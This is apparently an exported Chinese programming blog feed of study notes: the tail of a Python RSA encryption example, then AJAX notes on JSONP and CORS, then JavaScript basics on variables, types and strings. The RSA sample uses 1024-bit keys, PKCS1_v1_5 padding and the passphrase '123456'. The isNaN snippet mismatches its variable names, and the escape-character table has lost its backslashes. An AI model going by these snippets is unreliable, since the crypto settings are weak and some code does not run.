aa <span class="token operator">=</span> rsa_encrypt<span class="token punctuation">(</span>rsa_n<span class="token punctuation">,</span> rsa_e<span class="token punctuation">,</span> message<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>aa<span class="token punctuation">)</span>
</code></pre>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Cryptodome<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA

<span class="token keyword">from</span> Cryptodome<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> PKCS1_OAEP<span class="token punctuation">,</span> PKCS1_v1_5


<span class="token keyword">class</span> <span class="token class-name">MyRSA</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">create_rsa_key</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">"""
        创建RSA密钥
        步骤说明：
        1、从 Crypto.PublicKey 包中导入 RSA，创建一个密码
        2、生成 1024/2048 位的 RSA 密钥
        3、调用 RSA 密钥实例的 exportKey 方法，传入密码、使用的 PKCS 标准以及加密方案这三个参数。
        4、将私钥写入磁盘的文件。
        5、使用方法链调用 publickey 和 exportKey 方法生成公钥，写入磁盘上的文件。
        """</span>
        key <span class="token operator">=</span> RSA<span class="token punctuation">.</span>generate<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
        encrypted_key <span class="token operator">=</span> key<span class="token punctuation">.</span>exportKey<span class="token punctuation">(</span>passphrase<span class="token operator">=</span>password<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> pkcs<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">,</span>
                                      protection<span class="token operator">=</span><span class="token string">"scryptAndAES128-CBC"</span><span class="token punctuation">)</span>
        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"my_private_rsa_key.bin"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>encrypted_key<span class="token punctuation">)</span>
        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"my_rsa_public.pem"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>key<span class="token punctuation">.</span>publickey<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>exportKey<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> plaintext<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment"># 加载公钥</span>
        recipient_key <span class="token operator">=</span> RSA<span class="token punctuation">.</span>import_key<span class="token punctuation">(</span>
            <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"my_rsa_public.pem"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">)</span>
        cipher_rsa <span class="token operator">=</span> PKCS1_v1_5<span class="token punctuation">.</span>new<span class="token punctuation">(</span>recipient_key<span class="token punctuation">)</span>
        en_data <span class="token operator">=</span> cipher_rsa<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>plaintext<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> en_data
        <span class="token comment"># print(len(en_data), en_data)</span>

    <span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> en_data<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment"># 读取密钥</span>
        private_key <span class="token operator">=</span> RSA<span class="token punctuation">.</span>import_key<span class="token punctuation">(</span>
            <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"my_private_rsa_key.bin"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            passphrase<span class="token operator">=</span>password
        <span class="token punctuation">)</span>
        cipher_rsa <span class="token operator">=</span> PKCS1_v1_5<span class="token punctuation">.</span>new<span class="token punctuation">(</span>private_key<span class="token punctuation">)</span>
        data <span class="token operator">=</span> cipher_rsa<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>en_data<span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> data
        <span class="token comment"># print(data)</span>


mrsa <span class="token operator">=</span> MyRSA<span class="token punctuation">(</span><span class="token punctuation">)</span>
mrsa<span class="token punctuation">.</span>create_rsa_key<span class="token punctuation">(</span><span class="token string">'123456'</span><span class="token punctuation">)</span>
e <span class="token operator">=</span> mrsa<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span><span class="token string">'hello'</span><span class="token punctuation">)</span>
d <span class="token operator">=</span> mrsa<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token string">'123456'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span>
</code></pre>
<h2 id="附录：">@附录：</h2>
<p>非对称加密<br>
<a href="https://www.bilibili.com/video/BV1Ts411H7u9?from=search&amp;seid=2602407138388579895">https://www.bilibili.com/video/BV1Ts411H7u9?from=search&amp;seid=2602407138388579895</a></p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>加密算法</tag>
      </tags>
  </entry>
  <entry>
    <title>Ajax介绍</title>
    <url>/web/Ajax/</url>
    <content><![CDATA[<h1>AJAX的学习笔记(Node.js环境)</h1>
<p>AJAX学习的笔记，主要环境为Node.js</p>
<p>课程地址： <a href="https://www.bilibili.com/video/BV1WC4y1b78y">https://www.bilibili.com/video/BV1WC4y1b78y</a></p>
<h2 id="第一章：-原生Ajax">第一章： 原生Ajax</h2>
<h3 id="1-1-Ajax简介">1.1 Ajax简介</h3>
<ul>
<li>Ajax全称为Asynchronous Javascript And XML，即异步JS和XML</li>
<li>通过Ajax可以在浏览器中向服务器发送异步请求，最大的优势：<strong>无刷新获取数据</strong></li>
<li>AJAX不是新的编程语言，而是一种将现有的标准组合在一起使用的新方式</li>
</ul>
<h3 id="1-2-XML简介">1.2 XML简介</h3>
<ul>
<li>XML：可扩展标记语言</li>
<li>XML：被设计用来传输和存储数据</li>
<li>XML和HTML类似，不同点：HTML中都是预定义标签，XML中没有预定义标签，全是自定义标签，用来表示一些数据</li>
<li>现在已被JSON取代</li>
</ul>
<h3 id="1-3-AJAX-的特点">1.3 AJAX 的特点</h3>
<h4 id="1-3-1-AJAX的优点">1.3.1 AJAX的优点</h4>
<ol>
<li>可以无刷新页面与服务端进行通信</li>
<li>允许你根据用户事件来更新部分页面内容</li>
</ol>
<h4 id="1-3-2-AJAX-的缺点">1.3.2 AJAX 的缺点</h4>
<ol>
<li>没有浏览历史，不能回退</li>
<li>存在跨域问题（同源）</li>
<li>SEO不友好（爬虫获取不到信息）</li>
</ol>
<h3 id="1-4-AJAX-的使用">1.4 AJAX 的使用</h3>
<h4 id="1-4-1-核心对象">1.4.1 核心对象</h4>
<h2 id="第二章-jQuery中的AJAX">第二章 jQuery中的AJAX</h2>
<h3 id="2-1-get请求">2.1 get请求</h3>
<pre class="language-none"><code class="language-none">$.get(url, [data], [callback], [type])
url: 请求的URL地址
data: 请求携带的参数
callbac: 载入成功时回调函数
type：设置返回内容格式，xml、html、script、json、text、_default</code></pre>
<h2 id="第三章：-跨域">第三章： 跨域</h2>
<h3 id="3-1-同源策略">3.1 同源策略</h3>
<p>同源策略（Same-Origin Policy）最早由 Netscape 公司提出，是浏览器的一种安全策略。</p>
<p>同源：协议、域名、端口号 必须完全相同</p>
<p>违背同源策略就是跨域</p>
<h3 id="3-2-如何解决跨域">3.2 如何解决跨域</h3>
<h4 id="3-2-1-JSONP">3.2.1 JSONP</h4>
<ol>
<li>
<p>JSONP是什么</p>
<p>JSONP (JSON with Padding)，是一个非官方的跨域解决方案，纯粹凭借程序员的聪明才智开发出来，只支持get请求</p>
</li>
<li>
<p>JSONP 怎么工作的？</p>
<p>在网页有一些标签天生具有跨域能力，比如：img, link, iframe, script</p>
<p>JSONP就是利用<strong>script</strong>标签的跨域能力来发送请求的</p>
</li>
<li>
<p>JSONP的使用</p>
<ul>
<li>动态的创建一个script标签</li>
</ul>
<pre class="language-none"><code class="language-none">var script &#x3D; document.createElement(&quot;script&quot;);</code></pre>
<ul>
<li>设置script的src，设置回调函数</li>
</ul>
<pre class="language-none"><code class="language-none">script.src &#x3D; &quot;http:&#x2F;&#x2F;locallhost:3000&#x2F;textAJAX?callback&#x3D;abc&quot;</code></pre>
</li>
</ol>
<h3 id="3-2-2-CORS">3.2.2 CORS</h3>
<p>推荐阅读：</p>
<ul>
<li><a href="http://www.ruanyifeng.com/blog/2016/04/cors.html">http://www.ruanyifeng.com/blog/2016/04/cors.html</a></li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS</a></li>
</ul>
<ol>
<li>
<p>CORS是什么？</p>
<p>CORS (Cross-Origin Resource Sharing), 跨域资源共享。CORS 是官方的跨域解决方案，它的特点是不需要在客户端做任何特殊的操作，完全在服务器中进行处理，支持 get 和 post 等请求。跨域资源共享标准新增了一组 HTTP 首部字段（响应头），允许服务器声明哪些源站通过浏览器有权限访问哪些资源</p>
</li>
<li>
<p>CORS怎么工作的？</p>
<p>CORS 是通过设置一个响应头来告诉浏览器，该请求允许跨域，浏览器收到该响应以后就会对响应放行。</p>
</li>
<li>
<p>CORS 的使用</p>
<p>主要是服务端的设置：</p>
<pre class="language-none"><code class="language-none">rounter.get(&quot;&#x2F;testAJAX&quot;,function(req, res)&#123;

&#125;)</code></pre>
</li>
</ol>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>Ajax</tag>
        <tag>Node.js</tag>
      </tags>
  </entry>
  <entry>
    <title>Javascript基础知识</title>
    <url>/javascript/JavaScript-Base/</url>
    <content><![CDATA[<h2 id="JavaScript">JavaScript</h2>
<h4 id="JavaScript-是什么">JavaScript 是什么</h4>
<ul>
<li>
<p>JavaScript 是世界上最流行的语言之一，是一种运行在客户端的脚本语言 （Script 是脚本的意思）</p>
</li>
<li>
<p>脚本语言：不需要编译，运行过程中由 js 解释器( js 引擎）逐行来进行解释并执行</p>
</li>
<li>
<p>现在也可以基于 Node.js 技术进行服务器端编程</p>
<p><img src="https://s2.loli.net/2022/01/25/7UFEvY9lauOiqbc.png" alt=""></p>
</li>
</ul>
<h4 id="JS-的组成">JS 的组成</h4>
<p><img src="https://s2.loli.net/2022/01/25/8i4RHyIjNFV1s2p.png" alt=""></p>
<ol>
<li>
<h4 id="ECMAScript"><strong>ECMAScript</strong></h4>
<p>ECMAScript 是由ECMA 国际（ 原欧洲计算机制造商协会）进行标准化的一门编程语言，这种语言在万维网上应用广泛，它往往被称为 JavaScript或 JScript，但实际上后两者是 ECMAScript 语言的实现和扩展。</p>
<p><img src="https://s2.loli.net/2022/01/25/eW7KSO2UdczP6Rp.png" alt=""></p>
<p>ECMAScript：规定了JS的编程语法和基础核心知识，是所有浏览器厂商共同遵守的一套JS语法工业标准。</p>
<p>更多参看MDN: <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/JavaScript_technologies_overview">MDN手册</a></p>
</li>
<li>
<h4 id="DOM——文档对象模型"><strong>DOM——文档对象模型</strong></h4>
<p><strong>文档对象模型</strong>（Document Object Model，简称DOM），是W3C组织推荐的处理可扩展标记语言的标准编程接口。通过 DOM 提供的接口可以对页面上的各种元素进行操作（大小、位置、颜色等）</p>
</li>
<li>
<h4 id="BOM——浏览器对象模型"><strong>BOM——浏览器对象模型</strong></h4>
<p><strong>浏览器对象模型</strong>(Browser Object Model，简称BOM) 是指浏览器对象模型，它提供了独立于内容的、可以与浏览器窗口进行互动的对象结构。通过BOM可以操作浏览器窗口，比如弹出框、控制浏览器跳转、获取分辨率等。</p>
</li>
</ol>
<h4 id="JS-初体验">JS 初体验</h4>
<p>JS 有3种书写位置，分别为行内、内嵌和外部。</p>
<ol>
<li>
<p>行内式</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>点我试试<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'Hello World'</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span> <span class="token punctuation">/></span></span></code></pre>
<ul>
<li>可以将单行或少量 JS 代码写在HTML标签的事件属性中（以 on 开头的属性），如：onclick</li>
<li>注意单双引号的使用：在HTML中我们推荐使用双引号, JS 中我们推荐使用单引号</li>
<li>可读性差， 在html中编写JS大量代码时，不方便阅读；</li>
<li>引号易错，引号多层嵌套匹配时，非常容易弄混；</li>
<li>特殊情况下使用</li>
</ul>
</li>
<li>
<p>内嵌式</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'Hello  World~!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre>
<ul>
<li>可以将多行JS代码写到 script 标签中</li>
<li>内嵌 JS 是学习时常用的方式</li>
</ul>
</li>
<li>
<p>外部JS文件</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>my.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre>
<ul>
<li>利于HTML页面代码结构化，把大段 JS代码独立到 HTML 页面之外，既美观，也方便文件级别的复用</li>
<li>引用外部 JS文件的 script 标签中间不可以写代码</li>
<li>适合于JS 代码量比较大的情况</li>
</ul>
</li>
</ol>
<h2 id="JS基本概念">JS基本概念</h2>
<h4 id="单行注释">单行注释</h4>
<p>为了提高代码的可读性，JS与CSS一样，也提供了注释功能。<br>
JS中的注释主要有两种，分别是 单行注释 和 多行注释。</p>
<p>单行注释的注释方式如下：</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 我是一行文字，不想被 JS引擎 执行，所以 注释起来	</span></code></pre>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 用来注释单行文字（  快捷键   ctrl  +  /   ）</span></code></pre>
<h4 id="多行注释">多行注释</h4>
<p>多行注释的注释方式如下：</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/*
  获取用户年龄和姓名
  并通过提示框显示出来
*/</span></code></pre>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/* 用来注释多行文字 */</span>  
</code></pre>
<h3 id="输入输出语句">输入输出语句</h3>
<p>为了方便信息的输入输出，JS中提供了一些输入输出语句，其常用的语句如下：</p>
<table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
<th>归属</th>
</tr>
</thead>
<tbody>
<tr>
<td>alert(msg)</td>
<td>浏览器弹出警示框</td>
<td>浏览器</td>
</tr>
<tr>
<td>console.log(msg)</td>
<td>浏览器控制台打印输出信息</td>
<td>浏览器</td>
</tr>
<tr>
<td>prompt(info)</td>
<td>浏览器弹出输入框，用户可以输入</td>
<td>浏览器</td>
</tr>
</tbody>
</table>
<ul>
<li>注意：alert() 主要用来显示消息给用户，console.log() 用来给程序员自己看运行时的消息。</li>
</ul>
<h4 id="声明变量">声明变量</h4>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//  声明变量  </span>
<span class="token keyword">var</span> age<span class="token punctuation">;</span> <span class="token comment">//  声明一个 名称为age 的变量     </span>
</code></pre>
<ul>
<li>
<p>var 是一个 JS关键字，用来声明变量( variable 变量的意思 )。使用该关键字声明变量后，计算机会自动为变量分配内存空间，不需要程序员管</p>
</li>
<li>
<p>age 是程序员定义的变量名，我们要通过变量名来访问内存中分配的空间</p>
</li>
</ul>
<h4 id="赋值">赋值</h4>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript">age <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment">// 给 age  这个变量赋值为 10          </span></code></pre>
<ul>
<li>= 用来把右边的值赋给左边的变量空间中   此处代表赋值的意思</li>
<li>变量值是程序员保存到变量空间里的值</li>
</ul>
<h4 id="变量的初始化">变量的初始化</h4>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> age  <span class="token operator">=</span> <span class="token number">18</span><span class="token punctuation">;</span>  <span class="token comment">// 声明变量同时赋值为 18</span>
<span class="token comment">// 声明一个变量并赋值， 我们称之为变量的初始化。</span></code></pre>
<h3 id="数据类型">数据类型</h3>
<h4 id="数据类型简介">数据类型简介</h4>
<ul>
<li>
<p>为什么需要数据类型</p>
<p>在计算机中，不同的数据所需占用的存储空间是不同的，为了便于把数据分成所需内存大小不同的数据，充分利用存储空间，于是定义了不同的数据类型。</p>
<p>简单来说，数据类型就是数据的类别型号。比如姓名“张三”，年龄18，这些数据的类型是不一样的。</p>
</li>
<li>
<p>变量的数据类型</p>
<p>变量是用来存储值的所在处，它们有名字和数据类型。变量的数据类型决定了如何将代表这些值的位存储到计算机的内存中。JavaScript 是一种弱类型或者说动态语言。这意味着不用提前声明变量的类型，在程序运行过程中，类型会被自动确定：</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> age <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>        <span class="token comment">// 这是一个数字型</span>
<span class="token keyword">var</span> areYouOk <span class="token operator">=</span> <span class="token string">'是的'</span><span class="token punctuation">;</span>   <span class="token comment">// 这是一个字符串     </span></code></pre>
</li>
</ul>
<p>在代码运行时，变量的数据类型是由 JS引擎 根据 = 右边变量值的数据类型来判断 的，运行完毕之后， 变量就确定了数据类型。JavaScript 拥有动态类型，同时也意味着相同的变量可用作不同的类型：</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> x <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>           <span class="token comment">// x 为数字</span>
<span class="token keyword">var</span> x <span class="token operator">=</span> <span class="token string">"Bill"</span><span class="token punctuation">;</span>      <span class="token comment">// x 为字符串    </span></code></pre>
<ul>
<li>
<p>数据类型的分类</p>
<p>JS 把数据类型分为两类：</p>
<ul>
<li>
<p>简单数据类型 （Number,String,Boolean,Undefined,Null）</p>
</li>
<li>
<p>复杂数据类型 （object)</p>
</li>
</ul>
</li>
</ul>
<h4 id="简单数据类型">简单数据类型</h4>
<p>简单数据类型（基本数据类型）</p>
<p>JavaScript 中的简单数据类型及其说明如下：</p>
<p><img src="https://s2.loli.net/2022/01/25/Png7fojKabtkYzB.png" alt=""></p>
<h5 id="数字型-Number">数字型 Number</h5>
<p>JavaScript 数字类型既可以保存整数，也可以保存小数(浮点数）。</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> age <span class="token operator">=</span> <span class="token number">21</span><span class="token punctuation">;</span>       <span class="token comment">// 整数</span>
<span class="token keyword">var</span> Age <span class="token operator">=</span> <span class="token number">21.3747</span><span class="token punctuation">;</span>  <span class="token comment">// 小数     </span></code></pre>
<ol>
<li>
<p>数字型进制</p>
<p>最常见的进制有二进制、八进制、十进制、十六进制。</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"> <span class="token comment">// 1.八进制数字序列范围：0~7</span>
<span class="token keyword">var</span> num1 <span class="token operator">=</span> <span class="token number">07</span><span class="token punctuation">;</span>   <span class="token comment">// 对应十进制的7</span>
<span class="token keyword">var</span> num2 <span class="token operator">=</span> <span class="token number">019</span><span class="token punctuation">;</span>  <span class="token comment">// 对应十进制的19</span>
<span class="token keyword">var</span> num3 <span class="token operator">=</span> <span class="token number">08</span><span class="token punctuation">;</span>   <span class="token comment">// 对应十进制的8</span>
 <span class="token comment">// 2.十六进制数字序列范围：0~9以及A~F</span>
<span class="token keyword">var</span> num <span class="token operator">=</span> <span class="token number">0xA</span><span class="token punctuation">;</span>   </code></pre>
<p>现阶段我们只需要记住，在JS中八进制前面加0，十六进制前面加 0x</p>
</li>
<li>
<p>数字型三个特殊值</p>
<ul>
<li>
<p>Infinity ，代表无穷大，大于任何数值</p>
</li>
<li>
<p>-Infinity ，代表无穷小，小于任何数值</p>
</li>
<li>
<p>NaN ，Not a number，代表一个非数值</p>
</li>
</ul>
</li>
<li>
<p>isNaN</p>
<p>用来判断一个变量是否为非数字的类型，返回 true 或者 false</p>
</li>
</ol>
<p><img src="https://s2.loli.net/2022/01/25/MSBmHIqdxtKc1Jw.png" alt=""></p>
   <pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> usrAge <span class="token operator">=</span> <span class="token number">21</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> isOk <span class="token operator">=</span> <span class="token function">isNaN</span><span class="token punctuation">(</span>userAge<span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>isNum<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">// false ，21 不是一个非数字</span>
<span class="token keyword">var</span> usrName <span class="token operator">=</span> <span class="token string">"andy"</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">isNaN</span><span class="token punctuation">(</span>userName<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// true ，"andy"是一个非数字</span></code></pre>
<h5 id="字符串型-String">字符串型 String</h5>
<p>字符串型可以是引号中的任意文本，其语法为 双引号 “” 和 单引号’’</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> strMsg <span class="token operator">=</span> <span class="token string">"我爱北京天安门~"</span><span class="token punctuation">;</span>  <span class="token comment">// 使用双引号表示字符串</span>
<span class="token keyword">var</span> strMsg2 <span class="token operator">=</span> <span class="token string">'我爱吃猪蹄~'</span><span class="token punctuation">;</span>    <span class="token comment">// 使用单引号表示字符串</span>
<span class="token comment">// 常见错误</span>
<span class="token keyword">var</span> strMsg3 <span class="token operator">=</span> 我爱大肘子<span class="token punctuation">;</span>       <span class="token comment">// 报错，没使用引号，会被认为是js代码，但js没有这些语法</span></code></pre>
<p>因为 HTML 标签里面的属性使用的是双引号，JS 这里我们更推荐使用单引号。</p>
<ol>
<li>
<p>字符串引号嵌套</p>
<p>JS 可以用单引号嵌套双引号 ，或者用双引号嵌套单引号 (外双内单，外单内双)</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> strMsg <span class="token operator">=</span> <span class="token string">'我是"高帅富"程序猿'</span><span class="token punctuation">;</span>   <span class="token comment">// 可以用''包含""</span>
<span class="token keyword">var</span> strMsg2 <span class="token operator">=</span> <span class="token string">"我是'高帅富'程序猿"</span><span class="token punctuation">;</span>  <span class="token comment">// 也可以用"" 包含''</span>
<span class="token comment">//  常见错误</span>
<span class="token keyword">var</span> badQuotes <span class="token operator">=</span> 'What on earth<span class="token operator">?</span>"<span class="token punctuation">;</span> <span class="token comment">// 报错，不能 单双引号搭配</span></code></pre>
<table>
<thead>
<tr>
<th>转义符</th>
<th>解释说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>\n</td>
<td>换行符，n   是   newline   的意思</td>
</tr>
<tr>
<td>\ \</td>
<td>斜杠   \</td>
</tr>
<tr>
<td>’</td>
<td>’   单引号</td>
</tr>
<tr>
<td>&quot;</td>
<td>”双引号</td>
</tr>
<tr>
<td>\t</td>
<td>tab  缩进</td>
</tr>
<tr>
<td>\b</td>
<td>空格 ，b   是   blank  的意思</td>
</tr>
</tbody>
</table>
</li>
<li>
<p>字符串长度（与Python不一样）</p>
<p>​		字符串是由若干字符组成的，这些字符的数量就是字符串的长度。通过字符串的 length 属性可以获取整个字符串的长度。</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> strMsg <span class="token operator">=</span> <span class="token string">"我是帅气多金的程序猿！"</span><span class="token punctuation">;</span>
<span class="token function">alert</span><span class="token punctuation">(</span>strMsg<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 显示 11</span></code></pre>
</li>
<li>
<p>字符串拼接</p>
<ul>
<li>
<p>多个字符串之间可以使用 + 进行拼接，其拼接方式为 字符串 + 任何类型 = 拼接之后的新字符串</p>
</li>
<li>
<p>拼接前会把与字符串相加的任何类型转成字符串，再拼接成一个新的字符串</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//1.1 字符串 "相加"</span>
<span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'hello'</span> <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> <span class="token string">'world'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// hello world</span>
<span class="token comment">//1.2 数值字符串 "相加"</span>
<span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'100'</span> <span class="token operator">+</span> <span class="token string">'100'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 100100</span>
<span class="token comment">//1.3 数值字符串 + 数值</span>
<span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'11'</span> <span class="token operator">+</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// 1112 </span></code></pre>
</li>
<li>
<p><em><strong>+ 号总结口诀：数值相加 ，字符相连</strong></em></p>
</li>
</ul>
</li>
<li>
<p>字符串拼接加强</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Alexation'</span> <span class="token operator">+</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 只要有字符就会相连 </span>
<span class="token keyword">var</span> age <span class="token operator">=</span> <span class="token number">18</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Alexation age 岁啦'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// 这样不行哦</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Alexation'</span> <span class="token operator">+</span> age<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// Alexation 18</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Alexation'</span> <span class="token operator">+</span> age <span class="token operator">+</span> <span class="token string">'岁啦'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Alexation 18岁啦</span></code></pre>
<ul>
<li>经常会将字符串和变量来拼接，变量可以很方便地修改里面的值</li>
<li>变量是不能添加引号的，因为加引号的变量会变成字符串</li>
<li>如果变量两侧都有字符串拼接，口诀“引引加加 ”，删掉数字，变量写加中间</li>
</ul>
</li>
</ol>
<h5 id="布尔型Boolean">布尔型Boolean</h5>
<p>布尔类型有两个值：true 和 false ，其中 true 表示真（对），而 false 表示假（错）。</p>
<p>布尔型和数字型相加的时候， true 的值为 1 ，false 的值为 0。</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token boolean">true</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 2</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token boolean">false</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1</span></code></pre>
<h5 id="Undefined和-Null">Undefined和 Null</h5>
<p>一个声明后没有被赋值的变量会有一个默认值undefined ( 如果进行相连或者相加时，注意结果）</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> variable<span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>variable<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment">// undefined</span>
